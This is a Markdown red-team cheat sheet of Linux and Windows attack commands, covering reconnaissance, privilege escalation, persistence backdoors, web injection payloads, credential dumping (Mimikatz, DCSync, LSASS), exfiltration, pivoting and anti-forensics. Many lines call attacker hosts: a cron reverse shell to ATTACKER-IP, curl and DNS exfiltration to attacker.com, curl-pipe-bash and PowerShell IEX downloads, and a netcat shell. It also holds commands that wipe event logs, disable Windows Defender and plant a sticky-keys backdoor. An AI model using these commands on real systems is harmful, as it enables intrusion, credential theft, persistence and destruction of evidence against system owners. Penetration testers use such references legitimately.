# Red Team - Linux & Windows

## 🔍 Core Info Gathering & Reconnaissance

### Linux Host Discovery & Network Recon

```bash
# Quick web server for file transfers/payloads
python3 -m http.server 8080
python -m SimpleHTTPServer 8080  # Python 2

# Basic port scan with bash (when tools restricted)
for port in {20..1024}; do (echo >/dev/tcp/10.10.10.5/$port) && echo "Port $port open"; done 2>/dev/null

# Advanced bash port scanner with timeout
for port in {1..65535}; do timeout 1 bash -c "echo '' > /dev/tcp/192.168.1.1/$port" && echo "Port $port is open"; done 2>/dev/null

# Check all network interfaces + IPs
ip a | grep inet
ifconfig | grep inet

# Monitor real-time network connections
watch -n 1 ss -tuna
watch -n 1 netstat -tulpn

# Check routing table
ip route
route -n

# ARP table enumeration
arp -a
ip neigh

# Find DNS servers
cat /etc/resolv.conf
systemd-resolve --status

# Network discovery via ping sweep
for i in {1..254}; do ping -c 1 192.168.1.$i >/dev/null 2>&1 && echo "192.168.1.$i is up"; done

# TCP SYN scan simulation
hping3 -S -p 80 192.168.1.1

# Banner grabbing
nc -nv 192.168.1.1 80
telnet 192.168.1.1 80
```

### Windows Host Discovery & Network Recon

```cmd
# Network interface information
ipconfig /all
netsh interface show interface

# ARP table
arp -a

# Network connections
netstat -ano
netstat -anb

# Routing table
route print
netsh interface ip show route

# DNS information
nslookup
ipconfig /displaydns

# Network discovery
for /L %i in (1,1,254) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up

# Port scanning with PowerShell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.1.1",$_)) "Port $_ is open"} 2>$null

# Banner grabbing
telnet 192.168.1.1 80
Test-NetConnection -ComputerName 192.168.1.1 -Port 80

# Quick web server (PowerShell)
python -m http.server 8080
```

## 🕵️ System Enumeration & Information Gathering

### Linux System Enumeration

```bash
# System information one-liner
whoami && uname -a && id && uptime

# Detailed system info
hostnamectl
cat /etc/os-release
lsb_release -a
cat /proc/version
cat /etc/issue

# Hardware information
lscpu
cat /proc/cpuinfo
free -h
df -h
lsblk
fdisk -l

# Users and groups
cut -d: -f1 /etc/passwd
getent passwd
cat /etc/group
w
who
last
lastlog

# Current user context
whoami
id
groups
sudo -l

# Environment variables
env
printenv
echo $PATH

# Running processes
ps aux
ps -ef
pstree
top
htop

# Services and daemons
systemctl list-units --type=service
service --status-all
chkconfig --list
ps aux | grep -v ]$

# Network services
ss -tulpn
netstat -tulpn
lsof -i

# Loaded kernel modules
lsmod
cat /proc/modules

# Scheduled tasks
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
for user in $(cut -d: -f1 /etc/passwd); do crontab -u $user -l 2>/dev/null; done

# Startup scripts
ls -la /etc/init.d/
ls -la /etc/systemd/system/
systemctl list-unit-files --type=service --state=enabled
```

### Windows System Enumeration

```cmd
# System information
systeminfo
hostname
whoami
whoami /all
echo %USERNAME%
echo %COMPUTERNAME%

# OS and patch information
wmic os get Caption,Version,BuildNumber,OSArchitecture
wmic qfe get Description,HotFixID,InstalledOn

# Hardware information
wmic computersystem get TotalPhysicalMemory,NumberOfProcessors
wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors
wmic logicaldisk get Size,FreeSpace,Caption

# Users and groups
net user
net localgroup
net localgroup administrators
wmic useraccount get Name,SID
query user

# Current user privileges
whoami /priv
whoami /groups

# Environment variables
set
echo %PATH%

# Running processes
tasklist
tasklist /svc
wmic process get Name,ProcessId,ParentProcessId,CommandLine

# Services
sc query
net start
wmic service get Name,State,StartMode,PathName

# Network information
netstat -ano
netsh advfirewall show allprofiles

# Scheduled tasks
schtasks /query /fo LIST /v
at

# Startup programs
wmic startup get Command,Caption,User
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Installed software
wmic product get Name,Version
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall
```

## 🔐 Privilege Escalation

### Linux Privilege Escalation

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# World-writable files
find / -type f -perm -o+w 2>/dev/null
find / -perm -002 -type f 2>/dev/null

# World-writable directories
find / -type d -writable 2>/dev/null
find / -perm -002 -type d 2>/dev/null

# Files with no owner
find / -nouser -o -nogroup 2>/dev/null

# Check sudo permissions
sudo -l
sudo -S -l

# Check for sudo version vulnerabilities
sudo --version

# Capabilities
getcap -r / 2>/dev/null

# Check for writable /etc/passwd
ls -la /etc/passwd
ls -la /etc/shadow

# Check for docker group membership
id | grep docker
ls -la /var/run/docker.sock

# Kernel exploits check
uname -a
cat /proc/version
searchsploit kernel $(uname -r)

# Check for vulnerable services
ps aux | grep root
systemctl list-units --type=service --state=running

# NFS shares
cat /etc/exports
showmount -e localhost

# Check /etc/fstab for interesting mounts
cat /etc/fstab

# Look for SSH keys
find / -name "*.pub" -o -name "*.pem" -o -name "id_*" 2>/dev/null
ls -la ~/.ssh/

# Check bash history
cat ~/.bash_history
find /home -name ".*history" -exec cat {} \; 2>/dev/null

# Search for passwords in files
grep -iR 'password\|passwd\|pwd' /etc 2>/dev/null
grep -iR 'password\|secret\|key\|token' /var 2>/dev/null
find . -type f -exec grep -l "password" {} \; 2>/dev/null

# MySQL command history
cat ~/.mysql_history

# Check for interesting files in /tmp and /var/tmp
ls -la /tmp
ls -la /var/tmp

# Check log files for sensitive info
find /var/log -type f -readable 2>/dev/null | xargs grep -l "password\|user\|login" 2>/dev/null
```

### Windows Privilege Escalation

```cmd
# Check current privileges
whoami /priv

# Check for unquoted service paths
wmic service get Name,PathName | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Check service permissions
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Users" *

# Check for weak service permissions
sc query
sc qc [servicename]

# Registry autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check for AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list
rundll32.exe keymgr.dll,KRShowKeyMgr

# SAM and SYSTEM files
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security

# Check for cached credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# PowerShell execution policy
powershell Get-ExecutionPolicy
powershell Get-ExecutionPolicy -Scope CurrentUser

# Windows version and patch level
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe get Description,HotFixID,InstalledOn | findstr /C:"KB"

# Check for interesting files
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Check recycle bin
dir C:\$Recycle.Bin /s /a

# Check for scheduled tasks running as SYSTEM
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run" /C:"Run As User"

# GPP passwords
findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml
```

## 💣 Persistence & Backdoors

### Linux Persistence

```bash
# Cron job backdoor (for demonstration)
echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1" | crontab -
(crontab -l ; echo "0 */12 * * * /tmp/.backdoor.sh") | crontab -

# At job
echo "/tmp/backdoor.sh" | at now + 1 minute

# Bashrc backdoor
echo "/tmp/backdoor.sh &" >> ~/.bashrc
echo "nohup /tmp/backdoor.sh &" >> ~/.profile

# SSH key persistence
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3N..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Service backdoor
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service

# Init script backdoor
echo "/tmp/backdoor.sh &" >> /etc/rc.local

# Motd backdoor
echo "/tmp/backdoor.sh &" >> /etc/update-motd.d/00-header

# Library hijacking
echo "/tmp" > /etc/ld.so.conf.d/backdoor.conf && ldconfig

# PAM backdoor (advanced)
cp /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
# Replace with backdoored version

# Kernel module backdoor (very advanced)
insmod /tmp/rootkit.ko
```

### Windows Persistence

```cmd
# Registry Run keys
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe"
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe"

# Scheduled task
schtasks /create /tn "System Update" /tr "C:\temp\backdoor.exe" /sc onlogon /ru System

# Service creation
sc create Backdoor binpath= "C:\temp\backdoor.exe" start= auto
net start Backdoor

# WMI event subscription
wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter48", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"

# Startup folder
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Image hijack
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\temp\backdoor.exe"

# DLL hijacking
copy backdoor.dll C:\Windows\System32\

# Sticky keys backdoor
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"

# PowerShell profile
echo "Start-Process C:\temp\backdoor.exe -WindowStyle Hidden" >> $PROFILE

# Logon script
reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\temp\backdoor.exe"
```

## 🌐 Web Application Testing

### Common Web Enumeration

```bash
# Directory enumeration
dirb http://target.com /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com
dnsrecon -d target.com -t brt

# Technology stack identification
whatweb http://target.com
nmap -sV --script=http-enum target.com

# SSL/TLS testing
sslscan target.com
testssl.sh target.com

# HTTP methods testing
nmap --script http-methods target.com
curl -X OPTIONS http://target.com -v

# Common vulnerabilities
nikto -h http://target.com
nmap --script vuln target.com

# Parameter fuzzing
ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://target.com/page?FUZZ=test

# XSS testing payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')

# SQL injection testing
' OR '1'='1
' UNION SELECT NULL--
'; DROP TABLE users--
' AND 1=1--
' AND 1=2--

# Command injection
; ls -la
| whoami
`id`
$(whoami)
```

### Burp Suite Shortcuts & Commands

```
# Useful Burp shortcuts
Ctrl+R - Send to Repeater
Ctrl+I - Send to Intruder
Ctrl+S - Send to Spider
Ctrl+Shift+B - Base64 encode/decode
Ctrl+Shift+U - URL encode/decode
Ctrl+U - URL decode
Ctrl+H - HTML encode/decode
```

## 🎯 Password Attacks

### Linux Password Attacks

```bash
# Hydra SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Hydra HTTP POST brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

# Hashcat
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Generate wordlist with crunch
crunch 8 8 -t @@@@@@%% -o wordlist.txt

# Medusa
medusa -h 192.168.1.1 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# Extract hashes from /etc/shadow
unshadow /etc/passwd /etc/shadow > hashes.txt

# Crack ZIP files
fcrackzip -D -p /usr/share/wordlists/rockyou.txt file.zip

# Online hash identification
hash-identifier
hashid hash.txt
```

### Windows Password Attacks

```cmd
# Extract SAM hashes
reg save HKLM\sam sam
reg save HKLM\system system
samdump2 system sam

# Dump cached credentials
cachedump

# LSASS dump with procdump
procdump -ma lsass.exe lsass.dmp

# Mimikatz commands
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::msv
sekurlsa::kerberos
sekurlsa::tspkg
lsadump::sam
lsadump::secrets
lsadump::cache

# Kerberoasting
GetUserSPNs.py domain/user:password -dc-ip 192.168.1.1 -request

# ASREPRoasting
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# DCSync attack
lsadump::dcsync /domain:domain.com /user:krbtgt

# Pass the hash
psexec.py -hashes :hash user@192.168.1.1

# Golden ticket
kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21... /krbtgt:hash /ticket:golden.kirbi
```

## 🔧 Data Exfiltration & File Transfer

### Linux File Transfer Methods

```bash
# HTTP server for downloads
python3 -m http.server 8080
python -m SimpleHTTPServer 8080

# SCP transfer
scp file.txt user@192.168.1.1:/tmp/

# SSH tunneling
ssh -L 8080:localhost:80 user@192.168.1.1

# Netcat file transfer
# Receiver
nc -l -p 1234 > file.txt
# Sender
nc 192.168.1.1 1234 < file.txt

# Base64 exfiltration
base64 file.txt | curl -X POST -d @- http://attacker.com/receive

# DNS exfiltration
for i in $(cat file.txt | base64 | tr -d '\n' | sed 's/.\{50\}/&\n/g'); do dig $i.attacker.com; done

# ICMP exfiltration
hping3 -1 -E file.txt -c 1 192.168.1.1

# Compress and exfiltrate
tar czf - /etc | nc 192.168.1.1 1234

# HTTP POST exfiltration
curl -X POST -F "file=@/etc/passwd" http://attacker.com/upload

# FTP upload
ftp 192.168.1.1
put file.txt

# Email exfiltration
echo "Subject: Data" | cat - file.txt | sendmail attacker@evil.com

# Steganography
steghide embed -cf image.jpg -ef secret.txt
```

### Windows File Transfer Methods

```cmd
# PowerShell download
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://attacker.com/file.exe','C:\temp\file.exe')"
powershell -c "Invoke-WebRequest -Uri http://attacker.com/file.exe -OutFile C:\temp\file.exe"

# Certutil download
certutil -urlcache -split -f http://attacker.com/file.exe file.exe

# BITSAdmin download
bitsadmin /transfer myDownloadJob /download /priority normal http://attacker.com/file.exe C:\temp\file.exe

# SMB copy
copy \\192.168.1.1\share\file.exe C:\temp\

# FTP download
echo open 192.168.1.1 > ftp.txt
echo anonymous >> ftp.txt
echo pass >> ftp.txt
echo binary >> ftp.txt
echo get file.exe >> ftp.txt
echo quit >> ftp.txt
ftp -s:ftp.txt

# Base64 encoding/decoding
certutil -encode file.exe file.b64
certutil -decode file.b64 file.exe

# PowerShell base64 exfiltration
powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\temp\file.txt'))"

# WMIC remote file copy
wmic /node:192.168.1.1 process call create "cmd /c copy file.exe \\attacker\share\"

# Alternate data streams
type file.txt > normal.txt:hidden.txt
more < normal.txt:hidden.txt
```

## 🔍 Log Analysis & Forensics

### Linux Log Analysis

```bash
# System logs
tail -f /var/log/syslog
tail -f /var/log/messages
journalctl -f

# Authentication logs
tail -f /var/log/auth.log
tail -f /var/log/secure

# Web server logs
tail -f /var/log/apache2/access.log
tail -f /var/log/nginx/access.log

# Failed login attempts
grep "Failed password" /var/log/auth.log
grep "authentication failure" /var/log/auth.log

# Successful logins
grep "Accepted" /var/log/auth.log
last
lastlog

# Clear logs (for demonstration)
> /var/log/auth.log
> /var/log/syslog
history -c
rm ~/.bash_history

# Find large files
find / -type f -size +100M 2>/dev/null

# Check deleted files still open
lsof +L1

# File timestamps
stat file.txt
ls -la --time-style=full-iso

# Network connections timeline
ss -tuln
netstat -tuln

# Process tree
pstree -p
ps auxf
```

### Windows Log Analysis

```cmd
# Event logs
eventvwr.msc
wevtutil qe System /c:10 /rd:true /f:text
wevtutil qe Security /c:10 /rd:true /f:text

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Recently accessed files
dir %APPDATA%\Microsoft\Windows\Recent

# Prefetch files
dir C:\Windows\Prefetch

# Browser history
dir "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default"
dir "%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles"

# USB device history
reg query HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR

# Network shares
net use
net share

# Clear logs (for demonstration)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# File timeline analysis
dir /tc C:\
forfiles /m *.* /c "cmd /c echo @path @fdate @ftime"

# Check alternate data streams
dir /r
```

## 🌐 Network Pivoting & Tunneling

### SSH Tunneling

```bash
# Local port forwarding
ssh -L 8080:localhost:80 user@192.168.1.1

# Remote port forwarding
ssh -R 8080:localhost:80 user@192.168.1.1

# Dynamic port forwarding (SOCKS proxy)
ssh -D 8080 user@192.168.1.1

# SSH through multiple hops
ssh -J user1@host1 user2@host2

# SSH with key
ssh -i key.pem user@192.168.1.1

# SSH tunnel with compression
ssh -C -D 8080 user@192.168.1.1

# Persistent SSH tunnel
autossh -M 20000 -D 8080 user@192.168.1.1
```

### Netcat Pivoting

```bash
# Netcat relay
nc -l -p 8080 -c "nc 192.168.1.1 80"

# Reverse shell relay
nc -l -p 4444 -e /bin/bash
nc attacker.com 4444 -e /bin/bash

# File transfer relay
nc -l -p 1234 | nc 192.168.1.1 1234

# Port scanning through pivot
nc -z -v 192.168.1.1 1-1000
```

### Metasploit Pivoting

```bash
# Add route through session
route add 192.168.2.0 255.255.255.0 1

# SOCKS proxy
use auxiliary/server/socks4a
set SRVPORT 8080
run

# Port forwarding
portfwd add -l 8080 -p 80 -r 192.168.2.1
portfwd list
portfwd delete -l 8080

# Autoroute
use post/multi/manage/autoroute
set SESSION 1
run
```

## 🎭 Anti-Forensics & Evasion

### Linux Anti-Forensics

```bash
# Clear command history
history -c
rm ~/.bash_history
ln -sf /dev/null ~/.bash_history

# Clear log files
> /var/log/auth.log
> /var/log/syslog
> /var/log/messages

# Timestamp manipulation
touch -r original.txt modified.txt
touch -t 202301010000 file.txt

# Secure file deletion
shred -vfz -n 3 file.txt
dd if=/dev/urandom of=file.txt bs=1M count=10
rm file.txt

# Hide files
mv file.txt .hidden_file.txt
chattr +i file.txt  # Immutable
chattr +a file.txt  # Append only

# Process hiding
exec -a "systemd" ./malware

# Memory-only execution
curl http://attacker.com/script.sh | bash
wget -qO- http://attacker.com/script.sh | bash

# Rootkit-style hiding
mount --bind /empty_dir /proc/PID

# Kernel module loading
insmod rootkit.ko
rmmod rootkit

# Time manipulation
date -s "2023-01-01 00:00:00"
hwclock --set --date="2023-01-01 00:00:00"
```

### Windows Anti-Forensics

```cmd
# Clear event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"

# PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath
del "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# Timestamp manipulation
powershell -c "(Get-Item file.txt).CreationTime = Get-Date '01/01/2023 00:00:00'"
powershell -c "(Get-Item file.txt).LastWriteTime = Get-Date '01/01/2023 00:00:00'"

# Secure file deletion
sdelete -p 3 -s -z C:\temp\file.txt
cipher /w:C:\temp\

# Hide files
attrib +h +s file.txt
echo data > file.txt:hidden

# Registry manipulation
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Process injection
powershell -c "Start-Process notepad; $proc = Get-Process notepad; [System.Runtime.InteropServices.Marshal]::Copy([byte[]]@(0x90,0x90), 0, $proc.Handle, 2)"

# NTFS alternate data streams
echo secret > file.txt:hidden
type file.txt:hidden

# Memory-only PowerShell
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://attacker.com/script.ps1'))"

# Disable Windows Defender
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
sc stop WinDefend
sc config WinDefend start= disabled
```

## 🔐 Credential Harvesting

### Linux Credential Harvesting

```bash
# Search for passwords in files
grep -r "password" /etc/
grep -iR 'password\|passwd\|pwd\|secret\|key' /var/
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

# Database connection strings
grep -r "jdbc:" /opt/
grep -r "connection string" /var/www/

# SSH keys
find / -name "*.pub" -o -name "*.pem" -o -name "id_*" 2>/dev/null
find /home -name ".ssh" -type d 2>/dev/null

# Browser saved passwords
ls ~/.mozilla/firefox/*/logins.json
ls ~/.config/google-chrome/Default/Login\ Data

# Configuration files
cat ~/.bashrc | grep -i pass
cat ~/.profile | grep -i pass
cat /etc/mysql/my.cnf
cat /etc/apache2/sites-available/default*

# Mail files
cat /var/mail/root
cat /var/spool/mail/root

# Cron jobs with credentials
cat /etc/crontab
ls -la /etc/cron.d/

# Process list for credentials
ps aux | grep -i pass
ps aux | grep -i mysql

# Memory dumps
gcore $(pidof process_name)
strings /proc/PID/mem

# Extract from .git directory
find . -name ".git" -type d 2>/dev/null
cat .git/config
git log --oneline
```

### Windows Credential Harvesting

```cmd
# Registry credentials
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Unattend files
dir C:\Windows\Panther\Unattend.xml
dir C:\Windows\Panther\Unattended.xml
```